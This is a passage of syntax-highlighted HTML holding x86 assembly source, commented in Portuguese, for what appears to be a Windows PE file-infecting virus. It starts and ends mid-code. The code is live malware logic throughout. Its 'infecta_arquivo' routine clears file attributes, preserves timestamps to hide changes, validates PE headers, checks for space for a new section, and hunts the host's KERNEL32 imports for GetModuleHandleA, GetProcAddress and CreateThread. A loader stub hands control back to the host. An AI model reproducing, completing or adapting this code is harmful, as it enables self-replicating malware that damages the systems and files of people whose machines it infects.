       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0e9h</span><span class="sc0">                                  </span><span class="sc1">;continua execuá∆o no host</span><span class="sc0">
  </span><span class="sc5">endereco_host</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">fim_loader</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">

</span><span class="sc5">constroi_bloco</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                 </span><span class="sc1">;salva contador de blocos</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">BLOCOS</span><span class="sc4">*</span><span class="sc2">6</span><span class="sc4">)]</span><span class="sc0">                </span><span class="sc1">;edi=buffer temporario</span><span class="sc0">
  </span><span class="sc5">proximo_byte</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">imul</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">BLOCOS</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">v_ini</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">stosb</span><span class="sc0">
       </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">250</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">proximo_byte</span><span class="sc0">                         </span><span class="sc1">;constroi bloco de 249 bytes</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">250</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">_rsencode</span><span class="sc0">                           </span><span class="sc1">;calcula c¢digo de correá∆o de erro</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">LOCAL_DATA</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc9">SIZE</span><span class="sc0"> </span><span class="sc5">IMAGE_NT_HEADERS</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+(</span><span class="sc2">8</span><span class="sc4">*</span><span class="sc2">3</span><span class="sc4">)+(</span><span class="sc5">IMAGE_SIZEOF_SECTION_HEADER</span><span class="sc4">*</span><span class="sc2">10</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">infecta_arquivo</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">pushad</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">LOCAL_DATA</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+(</span><span class="sc2">8</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc5">LOCAL_DATA</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">GetFileAttributesA</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">SIZE</span><span class="sc0"> </span><span class="sc5">IMAGE_NT_HEADERS</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">;salva atributos do arquivo</span><span class="sc0">
       </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">puta_merda</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">FILE_ATTRIBUTE_NORMAL</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+(</span><span class="sc2">8</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc5">LOCAL_DATA</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SetFileAttributesA</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;limpa atributos</span><span class="sc0">
       </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">puta_merda</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+(</span><span class="sc2">8</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc5">LOCAL_DATA</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">verifica</span><span class="sc0">
       </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">ja_infectado</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                                 </span><span class="sc1">;parÉmetro para CloseHandle</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">SIZE</span><span class="sc0"> </span><span class="sc5">IMAGE_NT_HEADERS</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
       </span><span class="sc6">lodsd</span><span class="sc0">
       </span><span class="sc6">lodsd</span><span class="sc0">                                    </span><span class="sc1">;esi+=8</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
       </span><span class="sc6">lodsd</span><span class="sc0">
       </span><span class="sc6">lodsd</span><span class="sc0">                                    </span><span class="sc1">;esi+=8</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">GetFileTime</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">;salva FILETIME</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">infectou?</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
       </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">puta_que_pariu</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">temp</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">SIZE</span><span class="sc0"> </span><span class="sc5">IMAGE_NT_HEADERS</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ReadFile</span><span class="sc4">]</span><span class="sc0">                      </span><span class="sc1">;là PE header</span><span class="sc0">
       </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">fudeu</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">temp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc9">SIZE</span><span class="sc0"> </span><span class="sc5">IMAGE_NT_HEADERS</span><span class="sc0">
       </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">fudeu</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.NT_Signature</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">IMAGE_NT_SIGNATURE</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">fudeu</span><span class="sc0">                                </span><span class="sc1">;Ç PE de veras?</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.NT_FileHeader.FH_Machine</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">IMAGE_FILE_MACHINE_I386</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">fudeu</span><span class="sc0">                                </span><span class="sc1">;roda em Intel 386+</span><span class="sc0">
       </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">9</span><span class="sc0">                                </span><span class="sc1">;arquivo tem seá‰es demais...</span><span class="sc0">
       </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">fudeu</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.NT_FileHeader.FH_Characteristics</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
       </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">IMAGE_FILE_EXECUTABLE_IMAGE</span><span class="sc4">+</span><span class="sc5">IMAGE_FILE_DLL</span><span class="sc0">
       </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">fudeu</span><span class="sc0">                                </span><span class="sc1">;n∆o Ç DLL mas Ç executavel</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">                               </span><span class="sc1">;eax*=32</span><span class="sc0">
       </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">                               </span><span class="sc1">;ecx*=8</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">;ecx=eax*40</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">tsecao</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                        </span><span class="sc1">;salva tamanho das SectionHeaders</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">SIZE</span><span class="sc0"> </span><span class="sc5">IMAGE_NT_HEADERS</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+(</span><span class="sc2">8</span><span class="sc4">*</span><span class="sc2">3</span><span class="sc4">)]</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">temp</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ReadFile</span><span class="sc4">]</span><span class="sc0">                      </span><span class="sc1">;là SectionHeaders</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_PointerToRawData</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">pe_ptr</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">tsecao</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">IMAGE_SIZEOF_SECTION_HEADER</span><span class="sc4">+</span><span class="sc9">SIZE</span><span class="sc0"> </span><span class="sc5">IMAGE_NT_HEADERS</span><span class="sc0">
       </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">fudeu</span><span class="sc0">                                 </span><span class="sc1">;n∆o tem espaáo pra nova seá∆o</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.NT_OptionalHeader.OH_DirectoryEntries.DE_Import.DD_Size</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">fudeu</span><span class="sc0">                                 </span><span class="sc1">;n∆o tem ImportTable?</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.NT_OptionalHeader.OH_DirectoryEntries.DE_Import.DD_VirtualAddress</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc5">IMAGE_SIZEOF_IMPORT_DESCRIPTOR</span><span class="sc0">
  </span><span class="sc5">proxima_dll</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">IMAGE_SIZEOF_IMPORT_DESCRIPTOR</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.ID_Name</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">le4</span><span class="sc0">                                 </span><span class="sc1">;là ponteiro pro nome da DLL</span><span class="sc0">
       </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">fudeu</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">le8</span><span class="sc0">                                 </span><span class="sc1">;pega 8 bytes do nome</span><span class="sc0">
       </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">fudeu</span><span class="sc0">
       </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">20202020h</span><span class="sc0">
       </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">00002020h</span><span class="sc0">                   </span><span class="sc1">;passa nome da dll pra maiusculas</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"NREK"</span><span class="sc0">
       </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">proxima_dll</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"23LE"</span><span class="sc0">                          </span><span class="sc1">;verifica se Ç a malvada</span><span class="sc0">
       </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">proxima_dll</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                             </span><span class="sc1">;[edi.ID_Characteristics]</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">le4</span><span class="sc0">
       </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">fudeu</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.ID_FirstThunk</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">le4</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                                  </span><span class="sc1">;esi=lista de nomes</span><span class="sc0">
       </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">fudeu</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                            </span><span class="sc1">;existe uma HintTable?</span><span class="sc0">
       </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">nomes_separados</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                             </span><span class="sc1">;n∆o, Ç tudo o mesmo</span><span class="sc0">
  </span><span class="sc5">nomes_separados</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.NT_OptionalHeader.OH_ImageBase</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;edi=ponteiros no EXE</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">para_correcao</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">GMHA</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">GPA</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                           </span><span class="sc1">;limpa endereáos</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">host_createthread</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
  </span><span class="sc5">le_nome</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">le4</span><span class="sc0">
       </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">ve_se_deu</span><span class="sc0">
       </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                            </span><span class="sc1">;j† foram todas as APIs?</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">ve_se_deu</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">                         </span><span class="sc1">;pula ordinal order</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">le8</span><span class="sc0">
       </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">le_proxima</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"MteG"</span><span class="sc0">                          </span><span class="sc1">;verifica se Ç GetModuleHandleA</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">ve_gpa</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"ludo"</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">le_proxima</span><span class="sc0">                           </span><span class="sc1">;GetModul????dleA</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">le8</span><span class="sc0">
       </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">le_proxima</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"Aeld"</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">le_proxima</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">GMHA</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">le_proxima</span><span class="sc0">
  </span><span class="sc5">ve_gpa</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"PteG"</span><span class="sc0">                          </span><span class="sc1">;verifica se Ç GetProcAddress</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">ve_ct</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"Acor"</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">le_proxima</span><span class="sc0">                           </span><span class="sc1">;GetProcA????</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">GPA</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">le_proxima</span><span class="sc0">
  </span><span class="sc5">ve_ct</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"aerC"</span><span class="sc0">                          </span><span class="sc1">;verifica CreateThread</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">le_proxima</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"hTet"</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">le_proxima</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">le4</span><span class="sc0">
       </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">le_proxima</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"daer"</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">le_proxima</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">host_createthread</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">le_proxima</span><span class="sc0">
  </span><span class="sc5">le_proxima</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                               </span><span class="sc1">;verifica proxima API do host</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">le_nome</span><span class="sc0">
  </span><span class="sc5">ve_se_deu</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">GMHA</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">fudeu</span><span class="sc0">
